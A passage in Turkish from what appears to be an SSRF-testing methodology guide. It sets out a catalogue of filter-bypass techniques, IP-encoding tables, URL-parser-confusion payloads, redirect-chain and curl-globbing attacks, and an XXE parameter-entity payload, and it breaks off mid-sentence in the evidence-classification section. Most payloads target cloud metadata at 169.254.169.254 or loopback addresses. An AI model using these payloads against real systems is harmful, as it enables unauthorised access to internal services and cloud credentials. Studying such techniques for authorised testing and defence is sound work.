| B16 | Scheme-relative / eksik şema normalizasyonu | common | `//169.254.169.254/` (bazı context'lerde şema otomatik `https:` olarak tamamlanır ve blacklist yalnızca tam URL string'ini kontrol ediyorsa atlanabilir) |
| B17 | CIDR/loopback range genişletmesi | core | Yalnızca `127.0.0.1` filtreleniyor olabilir — `127.0.0.0/8` bloğundaki **herhangi bir** adres (`127.127.127.127`, `127.0.1.3`, `127.0.0.0`, kısaltılmış `127.1`) de loopback'e eşdeğerdir, çoğu filtre yalnızca tam string `127.0.0.1`'i arar |
| B18a | Unicode separator ikamesi (hostname normalization) | experimental (fingerprint-önce) | Nokta (`.`) yerine ideographic full stop `。` (U+3002) veya benzeri Unicode "separator" karakterleri (`127。0。0。1`) — bu, IDNA/punycode normalizasyon zincirinden geçen bazı hostname parser'larının bu karakterleri gerçekten `.`'a eşdeğer saydığı **belgelenmiş bir davranıştır** (Unicode Technical Standard'daki "label separator" eşdeğerleri) — **yalnızca** hedefin IDNA normalizasyonu uyguladığına dair bir sinyal varsa (§8.2.3 URL Parser Matrix, veya IDN'e özgü bir davranış gözlemlenmişse) denenmeli |
| B18b | Circled-digit glyph ikamesi (rakam yerine) | highly-speculative (yalnızca son çare) | Rakam yerine circled digit glyph'leri (`①②⑦.⓪.⓪.⓪`) — B18a'dan farklı olarak bunun **standart bir Unicode normalizasyon kuralı** (NFKC gibi agresif bir normalizasyon dışında) tarafından desteklendiğine dair yaygın bir emsal yoktur; çoğu URL/IP parser bu glyph'leri hiç tanımaz ve payload olduğu gibi başarısız olur — yalnızca hedefin **özellikle** NFKC-tarzı agresif bir Unicode normalizasyonu uyguladığı ayrıca doğrulanmışsa (nadir) denenmeli, aksi halde düşük getirili bir request harcamasıdır |
| B19 | Malformed/eksik şema-ayracı | parser-specific | `http:127.0.0.1/` (çift slash olmadan), `http:@0/` → bazı parser'larda `http://localhost/`'a eşdeğer, `localhost:+11211aaa` gibi bozuk port formatları |
| B20 | curl URL globbing ile path obfuscation | framework/client-specific | curl'ün brace-expansion (`{a,b}`) ve range (`[1-9]`) "globbing" özelliği, `file://` üzerinden path traversal karakterlerini WAF pattern-matching'inden gizlemek için kullanılabilir — bkz. §8.2.5 |
| B21 | Anormal redirect status code zinciri | experimental (default-off, §8.2.5'teki 3 önkoşul karşılanmadan denenmez) | 301 dışındaki nadir/"tuhaf" 3xx kodlarının (305-310 aralığı gibi) art arda gönderilmesi, bazı HTTP client wrapper'larını "beklenmeyen durum" moduna sokup normal redirect-hedef doğrulamasını atlatabilir — bkz. §8.2.5 |
| B22 | Raw-string validation vs parsed-URL request — path-suffix zorunluluğu atlatma | conditional | **Önkoşul (mekanizma netliği için kritik):** Bu yalnızca validator'ın URL'i **ham string** olarak kontrol edip (örn. "sonunda `.jpg` var mı" diye regex/string kontrolü yaparak), asıl outbound isteği **standart bir URL parser** ile (fragment'i RFC gereği sunucuya hiç göndermeyen, `../` traversal'ı normalize eden bir parser ile) yapan sistemlerde çalışır — validator da parser kullanıyorsa (fragment'i validator da görmüyorsa) bu bypass **işe yaramaz**. Örnekler: `#/expected/path`, `#.extension` (fragment, ham string kontrolünü geçirir ama HTTP request-line'ına hiç dahil edilmez — bu davranış URL parser'ların RFC 3986 uyumluluğundan kaynaklanır, sunucu tarafı bir "gizleme" değildir) veya `expected/path/../../vulnerable/path` (path traversal — validator traversal'ı normalize etmeden ham string'i kontrol ediyorsa, parser'ın normalize ettiği gerçek hedef farklı olabilir) |
| B23 | IPv6 zone ID (scope ID) enjeksiyonu | experimental | `http://[fe80::1%25eth0]/` (`%25` = URL-encoded `%`, zone ID ayracı) — link-local IPv6 adreslerinde arayüz belirtme sözdizimi, bazı parser'lar zone ID'yi tanımayıp adresin geri kalanını farklı yorumlayabilir; ayrıca zone ID'nin kendisinin bir filtreleme boşluğu olup olmadığı da ayrıca test edilmeli |
| B24 | IDN/Unicode canonicalization mismatch ("homograph" yalnızca bir alt örneği) | conditional (parser-normalization-specific) | Bir domain allowlist'i görsel olarak `expected-domain.com`'a benzeyen ama farklı Unicode code point'lerinden oluşan bir IDN (Internationalized Domain Name) ile kaydedilmiş bir domain'i (punycode'a çevrildiğinde `xn--...` ile başlar) ayırt edemeyebilir — B18a/B18b'den farkı: B18a/B18b bir IP-literal'in içindeki karakterleri hedeflerken, B24 tamamen **domain adının kendisinin** görsel sahteciliğini hedefler. **Önkoşul (kritik — tekniğin ASIL mekanizması budur, "homograph" yalnızca yüzeysel bir belirtidir):** Bu yalnızca allowlist kontrolü ile asıl DNS resolver'ın **farklı bir canonical form** kullandığı durumlarda (örn. allowlist ham string karşılaştırması yaparken resolver IDNA normalizasyonu uyguluyorsa) bir bypass'tır — allowlist ve resolver aynı canonicalization'ı kullanıyorsa bu teknik işe yaramaz, önce bu farkın var olduğu doğrulanmalıdır |
| B25 | IPv4-compatible (deprecated) IPv6 gösterimi | experimental (legacy) | `http://[::127.0.0.1]/` — `::ffff:127.0.0.1` (IPv4-mapped, B5'te zaten var) formatından farklı olarak, RFC 4291'de deprecated edilmiş ama bazı eski network stack'lerinde hâlâ parse edilen "IPv4-compatible" format (`ffff` öneki olmadan) |
| B26 | HTTP Parameter Pollution (HPP) | common | Aynı parametre adının birden fazla kez gönderilmesi (`?url=https://expected-safe.com&url=http://169.254.169.254/`) — framework'e göre ilk veya son değer alınır; hangi katmanın (validation middleware'i mi, asıl handler mı) hangi değeri okuduğu framework'e özgü davranış farkı yaratabilir |
| B27 | JSON parametre array injection | common | Body bir JSON API'ye gidiyorsa, tekil string beklenen bir alana array göndermek (`{"url": ["https://expected-safe.com", "http://169.254.169.254/"]}`) — bazı JSON deserializer'lar/framework'ler bunu sessizce ilk veya son elemana indirger, validation ile asıl kullanım arasında B26'ya benzer bir okuma farkı yaratabilir |
| B28 | XXE parameter entity üzerinden dolaylı SSRF (bkz. §3.3) | parser-specific | `<!DOCTYPE foo [ <!ENTITY % pe SYSTEM "http://<canary>.oast.fun/"> %pe; ]>` — genel entity (`&xxe;`) yerine parameter entity (`%pe;`) kullanımı, bazı XML parser konfigürasyonlarında farklı bir kısıtlama/validation code path'inden geçtiği için genel entity'nin engellendiği durumlarda dahi çalışabilir; bu skill'in kapsamı yalnızca **sonucun** SSRF hedeflemesidir, parameter entity'nin XML-seviyesi detection/bypass metodolojisi ayrı bir XXE skill'inin konusudur (§3.3) |

**Deneme sırası kuralı:** §8.2.1'deki agresiflik sıralamasına ek
olarak, **aynı agresiflik kademesinde** birden fazla teknik varsa,
önce `core` → `common` → `parser/framework/provider-specific` →
`experimental` sırasıyla dene. `experimental` etiketli bir teknik
**yasak değildir**, yalnızca diğerleri tükenmeden önce denenmesi
verimsizdir.

Bu tablo **denenecek payload listesi değil**, bir sınıflandırmadır —
sıralı deneme stratejisi §8.2.1'de.

**Kasıtlı olarak eklenmeyenler (değerlendirilip reddedildi):**
- **`data:` URI'ler** — bu skill'in kapsamına girmez, çünkü bir
  `data:` URI **hiçbir outbound network isteği tetiklemez** (içerik
  URI'nin kendisinde gömülüdür, sunucu hiçbir yere bağlanmaz) — SSRF'nin
  tanımı gereği (§0.1) "sunucunun kendisinin bir hedefe bağlanması"dır;
  bir sink `data:` URI'yi render ediyorsa bu potansiyel olarak farklı
  bir zafiyet sınıfına (örn. stored XSS, eğer render edilen içerik
  HTML ise) işaret edebilir ama SSRF değildir.
- **HTTP Trailers üzerinden enjeksiyon** — teorik olarak ilgi çekici
  ama bu skill'in yazım anındaki araştırması bunu SSRF bağlamında
  **doğrulanmış, tekrarlanabilir bir teknik** olarak destekleyecek
  yeterli somut kaynağa ulaşamadı; spekülatif/doğrulanmamış bir
  tekniği somut payload olarak eklemek yerine, hedefte HTTP/2 kullanan
  bir chunked-encoding + trailer senaryosu görülürse bunun elle
  araştırılması önerilir (bkz. §15 "hard-code edilmeyen iddialar"
  prensibi).

### 8.2.1 Bypass Deneme Sırası (Agresiflik Artan)

1. Önce **format çeşitliliği** (B1-B5, B17, B19 — IP encoding/
   loopback-range/malformed-scheme varyantları) — düşük riskli,
   genelde WAF loglarını tetiklemez.
2. Ardından **parser confusion** (B8, B9, B11, B16, B22) —
   uygulamanın kendi URL parse mantığındaki farkı hedefler.
3. Ardından **protokol şeması değişikliği** (B12) ve **curl globbing**
   (B20, yalnızca hedefin curl-tabanlı bir HTTP client kullandığı
   fingerprint edilmişse) — blacklist'in kapsamadığı bir şema/encoding
   dene.
4. Yalnızca yukarıdakiler tükendiğinde **DNS-tabanlı** (B6, B7, B14 —
   B14 yalnızca bir "aldatmaca katmanı"dır, B6/B7 ile birlikte
   kullanılmalıdır, bkz. B14'ün düzeltilmiş tanımı) — bunlar genelde
   saldırganın kendi DNS sunucusunu/kaydını kontrol etmesini
   gerektirir, daha fazla hazırlık ister.
5. **Yalnızca ilgili fingerprint sinyali gözlemlendiyse** (§8.2.3 URL
   Parser Matrix, veya hedefin Unicode/IDN normalizasyonu uyguladığına
   dair başka bir kanıt) — Unicode/IDN tabanlı teknikler (**B18a**
   önce, **B18b** yalnızca B18a de negatif dönerse ve NFKC-tarzı bir
   normalizasyon ayrıca doğrulanmışsa; **B24** allowlist/resolver
   canonicalization farkı tespit edilmişse). Bu fingerprint sinyali
   yoksa bu aşama tamamen atlanır — körlemesine denenmez.
6. Son olarak **redirect zinciri** (B10), **allowlist zaafı** (B15) ve
   **anormal redirect status code zinciri** (B21) — yalnızca allowlist
   modeli tespit edildiğinde veya standart redirect zinciri (B10)
   negatif döndüğünde anlamlıdır (B21, B10'un daha agresif bir
   varyantıdır, kendi §8.2.5'teki 3 önkoşulu ayrıca sağlanmalıdır).

### 8.2.2 IP Encoding Varyantları — Tam Referans Tablosu

`127.0.0.1` hedefi için denenebilecek temsiller (aynı mantık herhangi
bir internal IP'ye uygulanabilir):

| Format | Örnek |
|---|---|
| Decimal (tam sayı) | `2130706433` |
| Octal (nokta ayraçlı) | `0177.0000.0000.0001` |
| Hex (nokta ayraçlı) | `0x7f.0x0.0x0.0x1` |
| Hex (tam sayı) | `0x7f000001` |
| Kısaltılmış (2 parça) | `127.1` |
| Kısaltılmış (3 parça) | `127.0.1` |
| Karışık taban | `0x7f.0.0.1`, `127.0.0.01` (öndeki sıfır bazı parser'larda octal sanılabilir) |
| IPv6-mapped IPv4 | `::ffff:127.0.0.1`, `::ffff:7f00:1` |
| IPv6 loopback (gerçek loopback) | `::1`, `[0000::1]` |
| IPv6/IPv4 unspecified address (loopback DEĞİL, ama OS'a göre pratikte eşdeğer davranabilir — bkz. §5 teknik not) | `[::]`, `0.0.0.0` |
| **CIDR/loopback range genişletmesi (B17)** | `127.127.127.127`, `127.0.1.3`, `127.0.0.0` — `127.0.0.0/8` bloğundaki **herhangi bir** adres loopback'tir, yalnızca `127.0.0.1` filtrelenmiş olabilir |
| **Unicode separator ikamesi (B18a)** | `127。0。0。1` (nokta yerine ideographic full stop `。`, U+3002) |
| **Circled-digit glyph ikamesi (B18b, highly-speculative)** | `①②⑦.⓪.⓪.⓪` (rakam yerine circled-digit glyph'leri) |
| **Malformed/eksik ayraç (B19)** | `http:127.0.0.1/` (şema sonrası `//` olmadan), `http:@0/` → bazı parser'larda `http://localhost/`'a eşdeğer |

**Kullanım kuralı:** Bu varyantların hepsini körlemesine denemek
yerine, önce hangi katmanın (uygulamanın kendi validator'ı mı, önündeki
bir WAF mı) IP'yi kontrol ettiğini §8.1'deki modelle belirle, sonra bu
tablodan agresiflik sırasına göre 3-4 varyant dene — hepsi negatif
dönerse hedefin IP formatını normalize ettikten sonra kontrol ettiği
sonucuna var. Onlarca varyantı elle üretmek yerine **ipfuscator**
(bkz. §15) gibi bir üretici araçla otomatikleştirilebilir.

### 8.2.3 URL Parser Confusion — Derinlemesine

Farklı diller/kütüphaneler bir URL'i **farklı** parse edebilir — bu
fark, "validation bu kütüphaneyle, asıl istek şu kütüphaneyle
yapılıyor" senaryolarında (örn. bir güvenlik middleware'i Python'un
`urllib.parse` ile kontrol ediyor, asıl istek `requests` kütüphanesiyle
atılıyor — ikisi teorik olarak aynı olmalı ama edge-case'lerde
farklılaşabilir) bir bypass fırsatı yaratır. Bu alandaki en kapsamlı
akademik referans Orange Tsai'nin **"A New Era of SSRF — Exploiting
URL Parser in Trending Programming Languages"** araştırmasıdır (bkz.
§15) — birçok dilin URL parser'ının RFC 3986'yı birbirinden farklı
yorumladığını gösterir.

**En sık karşılaşılan parser farkı — userinfo (`@`) ayrıştırması:**
```
http://trusted-domain.com@169.254.169.254/
```
RFC 3986'ya göre `@` öncesi userinfo'dur, `@` sonrası gerçek host'tur
— yani bu URL'in **gerçek hedefi** `169.254.169.254`'tür. Ama bazı
naif regex-tabanlı "domain kontrolü" implementasyonları yalnızca
string'in **başlangıcında** `trusted-domain.com` arayıp geçerli sayar.

**İkinci sık fark — birden fazla `@` işareti:**
```
http://trusted-domain.com@evil.com@169.254.169.254/
```
Bazı parser'lar **son** `@`'dan sonrasını host sayar, bazıları
**ilk** `@`'dan sonrasını — bu farkı test ederek hangi parser'ın
kullanıldığı da fingerprint edilebilir (§7).

**Üçüncü sık fark — backslash + çoklu `@` kombinasyonları (Orange
Tsai'nin araştırmasından, farklı dillerin parser'larını birbirinden
ayırt etmek için özellikle etkili bir set — hepsi ayrı ayrı denenmeli,
her biri farklı bir parser implementasyon hatasını hedefler):**
```
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
```
Bu dört varyantın her biri farklı bir "hangi kısım host, hangi kısım
userinfo/fragment" belirsizliğini test eder — bir parser `127.1.1.1`'i
host sanırken (validation bunu görür ve "izinli" diye işaretler),
gerçek istek `127.2.2.2`'ye gidebilir (veya tam tersi).

**Dördüncü fark — şema sonrası çift slash'ın tamamen eksik olması:**
```
http:127.0.0.1/
```
RFC'ye göre bu **geçersiz** bir URL'dir, ama bazı diller/kütüphaneler
(özellikle bazı eski Java/Python URL implementasyonları) bunu hataya
düşürmeden `127.0.0.1`'e istek atan geçerli bir URL olarak kabul eder
— bu, hem bir bypass hem de bir fingerprint sinyalidir (bkz. B19,
§8.2.2).

**URL Parser Matrix — dil/client fingerprint'inden hangi edge-case'e
öncelik verileceğine hızlı geçiş:** §7'de hedefin dilini/HTTP
client'ını fingerprint ettikten sonra, aşağıdaki tablo o dile/client'a
**özgü olarak bilinen** parser edge-case'ini önceliklendirmeyi sağlar
— bu bir kesin davranış garantisi değildir (sürüme göre değişir),
ama hangi bypass ailesinin (B8/B9/B19/B24/vb.) o hedefte denenmeye
**değer** olduğunu hızlıca daraltır:

| Dil/Stack | Yaygın Parser/Client | Öncelikli Edge-Case |
|---|---|---|
| Python | `urllib.parse` / `requests` | Genel URL canonicalization farkları; `requests` bazen `urllib3` üzerinden farklı bir normalizasyon uygular — validation ve istek farklı kütüphane kullanıyorsa özellikle kontrol et |
| Java | `java.net.URI` / `java.net.URL` | Scheme/authority ayrıştırma farkları (`URI` RFC 3986'ya daha sıkı uyar, `URL` daha toleranslıdır) — aynı string'in ikisinde farklı parse edilmesi mümkündür |
| Node.js | WHATWG URL (`new URL()`) | Backslash normalizasyonu (`\` bazı bağlamlarda `/`'e çevrilir) — B9'daki backslash confusion burada özellikle etkilidir |
| PHP | `parse_url()` / cURL | `parse_url()` (validation'da kullanılır) ile cURL'ün (asıl istekte kullanılır) **farklı kütüphaneler** olması — ikisi arasında canonicalization farkı klasik bir PHP SSRF deseni |
| .NET | `System.Uri` / `HttpClient` | `Uri` sınıfının kendi canonicalization'ı (bazı karakterleri otomatik encode/decode eder) — validation regex'i bu canonicalization'dan **önce mi sonra mı** çalışıyor, önemli bir fark yaratır |
| Go | `net/url` / `net/http` | Parsing (`net/url`) ile request-yapma (`net/http`) davranışının ayrı olması — `net/url` geçerli saydığı bir URL'i `net/http`'nin farklı yorumlaması mümkündür |

**Kullanım kuralı:** Bu tablo, §7 fingerprinting sonucunda hedefin
dili/stack'i makul bir güvenle belirlendiğinde, o satırdaki edge-case'i
**ilk sırada** denemeyi önerir — kesin değildir, sürüm/kütüphane
seçimine göre değişir, ama körlemesine tüm B8/B9/B19/B24 varyantlarını
sırasıyla denemekten daha verimlidir.

### 8.2.4 Redirect-Tabanlı Allowlist Bypass — Detaylı Akış

```
1. Kendi kontrolündeki bir HTTP sunucusu kur (veya bir "redirect
   servisi" kullan — bkz. §15 r3dir aracı, kendi sunucu barındırmadan
   seamless redirect target fuzzing sağlar)
2. Bu sunucunun ürettiği 301/302/307/308 response'unun Location
   header'ını hedef internal adrese (örn. http://169.254.169.254/
   latest/meta-data/) ayarla
3. Hedef uygulamaya, allowlist'te olduğunu bildiğin (veya olması
   muhtemel) bir domain yerine SENİN sunucunun URL'ini ver
4. Eğer hedef uygulamanın HTTP client'ı redirect'i OTOMATİK takip
   ediyorsa (çoğu HTTP client kütüphanesinin varsayılan davranışı),
   asıl istek internal hedefe gider
```

**Status code seçimi — KRİTİK nüans:** Sink'in orijinal isteği bir
`POST` ve/veya belirli bir body/header ile atması gerekiyorsa (örn.
bir webhook doğrulama isteği, imzalı bir body içeriyorsa), **301/302/303**
kullanma — bu kodlar RFC 7231 gereği bazı client'larda metodu
otomatik `GET`'e düşürür ve body'yi düşürebilir. Bunun yerine
**307 (Temporary Redirect)** veya **308 (Permanent Redirect)**
kullan — bu ikisi orijinal HTTP metodunu ve body'yi **korur**, bu da
redirect zincirinin sink'in beklediği isteği internal hedefe
olduğu gibi taşımasını sağlar.

**Önkoşul kontrolü:** Bu teknik yalnızca hedefin **allowlist** modeli
kullandığı tespit edildiğinde (§8.1 koruma hipotez listesi) anlamlıdır
— blacklist ağırlıklı bir hipotezde zaten doğrudan internal IP
denenebilir, redirect zincirine gerek yoktur (redirect zinciri burada
gereksiz bir karmaşıklık olur).

**Kritik ek test — "validate-once" mi "validate-every-hop" mu?**
Bir allowlist kontrolünün redirect zincirine karşı davranışı iki
farklı model izleyebilir, ve bu ayrım B10'un başarı ihtimalini
doğrudan belirler:

- **validate-before-first-request (TOCTOU riski taşır):** Uygulama
  yalnızca **kullanıcının verdiği ilk URL'i** allowlist'e karşı
  kontrol eder; HTTP client bir redirect aldığında **yeniden
  doğrulama yapmadan** onu takip eder. B10 bu modelde **çalışır**.
- **validate-every-hop (B10'u büyük ölçüde etkisiz kılar):** HTTP
  client, redirect zincirindeki **her yeni hedefi** de aynı
  allowlist/blacklist kontrolünden geçirir (bazı güvenlik-bilinçli
  HTTP client wrapper'ları — örn. bazı SSRF-koruma kütüphaneleri —
  bunu varsayılan yapar). Bu durumda B10 doğrudan başarısız olur; bu
  **B10'u tamamen elemez** ama sonraki adımı değiştirir — artık hedef,
  redirect'in **kendisini** değil, ara hedefin (allowlist'teki
  sunucunun) **DNS/IP seviyesinde** ele geçirilmesi (B6/B7) veya
  parser-seviyesi bir farkla ilk isteğin **kendisinde** zaten iki
  farklı hedef göstermesi (B8/B9) olmalıdır.

**Bu ayrımı test etme:** Kendi sunucunda iki farklı redirect
senaryosu kur: (1) allowlist'teki bir domain'e → **zararsız** bir
harici IP'ye yönlendiren bir redirect, (2) aynı allowlist domain'ine
→ **internal** bir IP'ye yönlendiren bir redirect. İkisi de kabul
ediliyorsa validate-once modeli; yalnızca (1) kabul edilip (2)
reddediliyorsa (veya farklı bir hata veriyorsa) validate-every-hop
modeli aktiftir — bu fingerprint sonucu `redirect_revalidation:
true/false` olarak §8.2.6'daki canonical resolution kaydına
eklenmelidir.

### 8.2.5 İleri Seviye Bypass Teknikleri — curl Globbing ve Anormal Redirect Zinciri

**curl URL globbing ile path/protokol obfuscation (B20):** Hedefin
outbound isteği curl (veya libcurl tabanlı bir kütüphane) ile
attığı fingerprint edildiyse (§7), curl'ün "URL globbing" özelliği
(brace-expansion `{a,b,c}` ve range-expansion `[1-10]`) bir WAF/
pattern-matching filtresinin **tanımadığı** ama curl'ün **doğru
şekilde genişlettiği** bir sözdizimiyle path traversal karakterlerini
gizlemek için kullanılabilir:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
Bu payload'da `{.}.` dizisi curl tarafından `..` olarak genişletilir
— literal `../../` string'ini arayan bir path-traversal filtresi bu
deseni tanımaz, ama curl aynı sonuca ulaşır. Bu teknik yalnızca
outbound HTTP client'ın **gerçekten** curl/libcurl olduğu
fingerprint edildiğinde denenmelidir (aksi halde hedefin URL parser'ı
globbing'i desteklemez, payload literal olarak başarısız olur).

**Anormal/"tuhaf" redirect status code zinciri (B21) — client
library'nin kendi hata-modu zaafını istismar etme:** Standart
301/302/307/308 dışındaki, HTTP spesifikasyonunda daha az kullanılan
3xx kodlarının (305, 306 [ayrılmış/kullanılmayan], 309, 310 gibi resmi
olmayan/uç kodlar dahil) **art arda** bir redirect zincirinde
gönderilmesi, bazı yüksek-seviye HTTP client wrapper kütüphanelerini
(özellikle "N tane olağandışı redirect gördüysem bir şeyler ters
gidiyor, hata ayıklama moduna geç ve response'u sorgulamadan geçir"
tarzı bir savunmacı programlama deseni içeren wrapper'ları) normal
güvenlik kontrol akışının **dışına** çıkarabilir — bu "hata modu"na
girdikten sonra wrapper, sıradaki bir 302'nin hedefini (örn. cloud
metadata IP'sini) artık doğrulamadan takip edebilir. Somut PoC deseni
(kendi kontrolündeki bir sunucuda):
```
/start  → 302 → /redir?count=1
/redir  → count'u 1 artırarak weird_status (302+count) ile kendine
          yönlendirmeye devam eder (305, 306, 307, 308, 309, 310...)
          N. (örn. 5.) turdan sonra nihai hedefe (örn.
          http://169.254.169.254/...) standart bir 302 ile yönlendirir
```
**Epistemik durum düzeltmesi — bu teknik "yaygın olarak kanıtlanmış"
değil, teorik/araştırma niteliklidir:** Bu tekniğin gerçek dünyada
tekrarlanabilir, geniş çaplı doğrulanmış bir kayıt geçmişi yoktur —
belirli, özel yapılandırılmış HTTP client wrapper'larında (redirect'i
manuel doğrulayan, kendi hop-sayacını tutan) **teorik olarak** mümkün
olduğu gösterilmiştir, "genel olarak etkili bir bypass" değildir.
**Ek netleştirme:** `309`/`310` gibi kodlar HTTP spesifikasyonunun
**standart bir parçası değildir** ve hiçbir client'ın bunları
"normal" bir redirect olarak tanıyacağı varsayılmamalıdır — bu
teknik yalnızca hedefte **gerçekten gözlemlenen, standart-dışı bir
custom redirect-handling davranışı** varsa araştırılmaya değerdir,
"305-310 aralığı genel olarak desteklenir" gibi bir varsayımla
denenmez.
**Varsayılan olarak ÇALIŞTIRILMAZ (default-off) — yalnızca aşağıdaki
önkoşulların TÜMÜ sağlandığında denenmelidir:**
1. Standart redirect zinciri (B10, §8.2.4) ve status code seçimi
   (307/308) denendiği halde **negatif** dönmüş olmalı, VE
2. Hedefte **özel/custom bir HTTP client wrapper** kullanıldığına
   dair bir fingerprint sinyali bulunmalı (örn. hata mesajlarında
   özel bir kütüphane adı, veya standart client'ların göstermeyeceği
   bir redirect-handling davranışı gözlemlenmiş olmalı), VE
3. Hedefin allowlist/blacklist koruması **redirect'i tekrar
   doğrulayan** (validate-every-hop, §8.2.4) türden olduğu tespit
   edilmiş olmalı — yalnızca bu tür bir korumaya karşı teorik olarak
   bir bypass fırsatı sunar.
Bu üç koşul sağlanmadan bu teknik denenmemelidir — düşük başarı
ihtimali + görece yüksek request maliyeti kombinasyonu, request
bütçesini (§10.6) daha değerli tekniklere ayırmayı gerektirir.

### 8.2.6 Canonical Target Resolution Model — Bypass Sonuçlarını Doğru Yorumlamak İçin Zorunlu Kayıt

Bir payload'ın "çalıştığı" veya "çalışmadığı" sonucu, tek başına
yeterli bir kayıt değildir — bypass denemelerinin **neden** işe
yaradığını (veya yaramadığını) doğru yorumlayabilmek için, her probe'un
ham girdisinden nihai bağlantı hedefine kadar geçirdiği **her
dönüşüm aşamasının** ayrı ayrı not edilmesi gerekir. Bu, §8.2.3'teki
parser confusion analizinin sistematik hale getirilmiş halidir:

```
raw_input            (payload'ın ham, gönderildiği hali)
  ↓
app_decode           (uygulamanın kendi decode/unescape adımı, varsa)
  ↓
url_parse            (şema, host, port, path, query, fragment ayrımı)
  ↓
hostname_extraction  (parser'ın "host" olarak neyi seçtiği — B8/B9'daki
                       userinfo/backslash confusion'ların tam olarak
                       burada gözlemlenmesi gerekir)
  ↓
idna_normalization   (IDN/punycode dönüşümü varsa — B24 ile ilgili)
  ↓
dns_resolution       (çözümlenen IP(ler) — birden fazla IP dönebilir,
                       hangisinin kullanıldığı önemli; IPv4 ve IPv6
                       kaydı FARKLI dönebilir, ikisi ayrı not edilmeli)
  ↓
ipv6_canonicalization (yalnızca IPv6/IPv4-mapped adresler için ayrı bir
                       karar noktası — bkz. aşağıdaki not)
  ↓
ip_normalization     (B1-B5/B17-B19'daki encoding'lerin son çözümü —
                       "sunucu bu IP'yi nasıl normalize etti")
  ↓
connection           (gerçek TCP bağlantısının kurulduğu IP:port —
                       IPv4 mi IPv6 mı kullanıldığı, "dual-stack"
                       bir hedefte hangisinin tercih edildiği önemli)
  ↓
redirect_chain       (varsa, her hop için bu zincirin TAMAMI ayrı
                       kaydedilmeli — bkz. aşağıdaki revalidation notu)
  ↓
final_target         (en sonunda gerçekten temas edilen adres)
```

**IPv6 canonicalization — neden ayrı bir karar noktası:** Bir IPv6
adresi (`::ffff:127.0.0.1`, `[::1]`, `[::]` gibi) validator'a
ulaştığında, validator'ın bunu **hangi kanonik forma** çevirdiği
(tam açılmış form mu, kısaltılmış mı, IPv4-mapped'i IPv4'e mi
indirgiyor mu) ile **socket katmanının** hangi adrese fiilen
bağlandığı **farklı olabilir** — bir blacklist validator'ı yalnızca
IPv4 formatını (`127.0.0.1`) tanıyorsa ama socket katmanı
`::ffff:127.0.0.1`'i sorunsuz `127.0.0.1`'e bağlıyorsa, bu iki
katman arasındaki canonicalization farkı doğrudan bir bypass
noktasıdır (B5/B26 bu farkı hedefler). Bu nedenle IPv6 içeren her
probe için validator'ın davranışı (kabul/red) ile gerçek bağlantının
hedefi ayrı ayrı kaydedilmelidir — "kabul edildi" tek başına
"bu adrese bağlanıldı" anlamına gelmez.

**Pratik kayıt şablonu — her confirmation denemesi için:**

| Alan | Açıklama |
|---|---|
| `raw_url` | Gönderilen tam payload |
| `parsed_scheme` / `parsed_host` / `parsed_port` | Uygulamanın (biliniyorsa, hata mesajından/davranışından çıkarılan) URL parse sonucu |
| `normalized_host` | IDNA/encoding sonrası normalize edilmiş host |
| `resolved_ips` | DNS çözümlemesi sonucu dönen IP(ler) — IPv4/IPv6 ayrı belirtilmeli |
| `ipv6_canonical_form` | Yalnızca IPv6/IPv4-mapped adresler için — validator'ın kabul ettiği form ile gerçek bağlantı hedefinin aynı olup olmadığı |
| `redirect_chain` | Varsa, sırayla her redirect hop'unun hedefi |
| `redirect_revalidation` | true/false/unknown — §8.2.4'teki testle belirlenen, redirect hedeflerinin de allowlist/blacklist'ten geçip geçmediği |
| `final_ip` / `final_url` | Nihai olarak temas edilen adres |

**Bu model neden önemli — somut fayda:** Bir IP-encoding bypass'ı
(örn. B3 hex encoding) "işe yaradı" göründüğünde, bu bilgi tek
başına **hangi katmanın** aşıldığını söylemez — `ip_normalization`
aşamasının blacklist kontrolünden **önce mi sonra mı** çalıştığını
bilmeden, aynı bypass'ın başka bir endpoint'te neden işe yaramadığını
(veya yarayacağını) tahmin etmek zordur. Bu tabloyu doldurmak, özellikle
birden fazla aday üzerinde çalışırken **hangi bypass'ın hangi
hedefte işe yaradığını sistematik olarak transfer edebilmeyi**
sağlar — aynı hedefteki başka bir endpoint muhtemelen aynı parser/
normalization zincirini kullanıyordur.

**Kullanım kuralı:** Bu, her tekil probe için ayrıntılı bir form
doldurmak anlamına gelmez — yalnızca **confirmed/probable** bir
sonuç elde edildiğinde, o probe'un tam zincirini geriye dönük olarak
(mümkün olduğunca, gözlemlenebilen kısmıyla) bu şemaya göre
kaydetmek yeterlidir; bu da §14.1 raporlama şablonundaki
"reproduction adımları" bölümünü doğrudan besler.

### 8.3 Evidence Kategorileri — İki Ayrı Eksen: Causality vs Attribution

```
Eksen 1 — Causality (SSRF'in kendisi)
├── Full/reflected evidence      (hedeften dönen içerik response'ta görünüyor)
├── OOB evidence                 (interactsh callback alındı)
├── Semi-blind differential evidence (§5.1 üçlü karşılaştırma — geçerli/kapalı-port/geçersiz)
└── Stored/indirect execution evidence (zincir haritalama ile doğrulandı mı)

Eksen 2 — Attribution (hangi hedef/ağ/cloud)
├── Target fingerprint evidence   (§7 — header/format sinyalleri)
├── Error signature evidence      (hedefe özgü hata mesajı)
└── Framework/CMS fingerprint evidence (§13 tablosundan)

Destekleyici (tek başına ne causality ne attribution kanıtlar)
└── Context evidence              (payload doğru context'e oturdu mu)
```

**Kanıt bağımsızlığı (Eksen 1 içinde):** Aynı canary domain'ine
gönderilen, yalnızca şema/format farkı olan (örn. `http://` vs
`https://` aynı canary'ye) iki payload, **tek bir kanıt** (OOB
evidence) sayılır. Farklı bir **kanal** (örn. hem OOB hem timing
differential) ile elde edilen ikinci bir kanıt, farklı bir evidence
kategorisi olarak sayılır.

### 8.4 False Positive / False Negative Eliminasyonu

**Sınıflandırma — iki ayrı sonuç üretir (SSRF classification VE hedef
attribution classification ayrı ayrı raporlanır):**

*SSRF (causality) classification:*
- **Confirmed:** Eksen 1'den **tek bir kanıt türü bile** yeterlidir —
  **ancak OOB evidence'ın DNS-only alt türü bu kuralın istisnasıdır**,
  aşağıda ayrıca tanımlanmıştır:
  - **OOB evidence — HTTP interaction (tek başına yeterli):**
    interactsh log'unda benzersiz canary'ye ait gerçek bir HTTP
    isteği kaydı — bu tek başına confirmed için yeterlidir, çünkü bir
    HTTP isteğinin tamamlanması (§1.5 P4) yalnızca DNS çözümlemesini
